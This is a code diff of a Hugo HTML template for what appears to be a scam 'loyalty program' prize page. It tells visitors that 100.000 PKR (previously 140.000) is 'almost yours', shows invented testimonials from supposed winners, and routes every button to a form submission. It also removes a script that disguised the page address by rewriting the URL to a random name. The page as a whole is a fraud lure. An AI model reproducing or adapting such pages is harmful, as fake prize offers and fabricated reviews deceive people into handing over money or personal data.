@@ -3,8 +3,10 @@
         <div id="header">
             <span class="menu"></span>
             <h3><span id="headline">LOYALTY PROGRAM</span></h3>
-            <span class="icon"></span>
+            <span class="icon">
+</span>
         </div>
+          
         <div id="container">
             <div align="center" id="firstpage">
                 <div class="date" id="topDate" style="padding-bottom: 10px; margin: 0;">
@@ -28,10 +30,10 @@
                 <div id="secondpage">
                     <div class="congrats">
                         <h4>
-                            <button href="/click" onclick="formSubmit();" style="cursor: pointer !important;" preventexitpop="false" rel="noreferrer">
-                                <font color="#0835e7">
+                            <button  onclick="formSubmit();" style="cursor: pointer !important;" preventexitpop="false" rel="noreferrer">
+                                <font color="#eee">
                                     Congratulations!<br />
-                                    <span style="color: #ff0000;">140.000 PKR</span> almost yours!
+                                    <span style="color: #ff0000;">100.000 PKR</span> almost yours!
                                 </font>
                             </button>
                         </h4>
@@ -59,11 +61,11 @@
                             <div style="padding: 10px 5px 10px 0; text-align: center;"><img src="/img/money-2.png" style="max-width: 170px;" /></div>
                             <div style="line-height: 1.6;">
                                 <p style="text-align: left;">
-                                    <button href="/click" onclick="formSubmit();" style="cursor: pointer !important;" preventexitpop="false" rel="noreferrer"><span class="name">140.000 PKR</span></button>
+                                    <button  onclick="formSubmit();" style="cursor: pointer !important;" preventexitpop="false" rel="noreferrer"><span class="name">100.000 PKR</span></button>
                                 </p>
 
                                 <div>
-                                    <button class="button" href="/click" onclick="formSubmit();" style="cursor: pointer !important;" preventexitpop="false" rel="noreferrer"> Select </button>
+                                    <button class="button"  onclick="formSubmit();" style="cursor: pointer !important;" preventexitpop="false" rel="noreferrer"> Select </button>
                                 </div>
                             </div>
                         </div>
@@ -141,7 +143,7 @@
                                     <td align="left" valign="top">
                                         <div class="comment_name">Fatima</div>
                                         <div class="comment_text">
-                                            Saw this one time offer and clicked it off because I thought it was fake. I saw the ad again and because I was bored so I decided to try it ... And I got a 140.000 PKR! What!!?!
+                                            Saw this one time offer and clicked it off because I thought it was fake. I saw the ad again and because I was bored so I decided to try it ... And I got a 100.000 PKR! What!!?!
                                         </div>
                                         <div class="comments__item__meta">
                                             <div class="item_date">
@@ -232,15 +234,17 @@
 {{ $jquery := resources.Get "js/jquery.min.js" | fingerprint }}
 <script src="{{ $jquery.RelPermalink }}"></script>
 
-{{ if .Params.modal }}
-{{ $modal := resources.Get .Params.modal | js.Build  | fingerprint }}
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.i18n/1.0.9/jquery.i18n.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.i18n/1.0.9/jquery.i18n.messagestore.min.js"></script>
+
+{{ range .Params.modals }}
+{{ $modal := resources.Get . | js.Build  | fingerprint }}
 <!-- Use this for external scripts -->
 <script src="{{ $modal.RelPermalink }}"></script>
 <!-- Use this for inline scripts -->
 <!--<script> {{ $modal.Content | safeJS }} </script> -->
 {{ end }}
-
-
+  
 
         <canvas id="my-canvas" style="position: absolute; top: 0; width: 100%;" height="880"></canvas>
         <button id="show-modal" class="btn"></button>
@@ -250,36 +254,7 @@
             confetti.render();
         </script>
 
-<script>
-    (function(){
-      var url = window.location.href;
-      var newFile = (Math.random() + 1).toString(36).substr(2, 4);
-    //   var newFile = 'hardcoded_name';
-  
-      var split = url.split("/");
-  
-    //   console.log(window.location.pathname)
-    //   console.log(split[split.length - 1]); // ouput 
-  
-      // check if url path ends in trailing slash
-      if (window.location.pathname.slice(-1) === "/") {
-        split[split.length - 2] = "" + newFile;
-      // otherwise assume it's a index file
-      } else {
-        index = split[split.length - 1];
-        indexPrefix = index.substr(0, index.indexOf('.')); // get index prefix name
-        indexSuffix = index.substr(index.indexOf('.')); // get everything starting from period
-        split[split.length - 1] = newFile + indexSuffix; // rewrite prefix name + re-concatenate everything else
-  
-      }
-  
-      var newUrl = split.join("/");
-  
-      if (typeof window.history.replaceState === 'function') {
-          history.replaceState({}, '', newUrl);
-      }
-    })();
-  </script>
+
 
     </body>
 {{ end }}
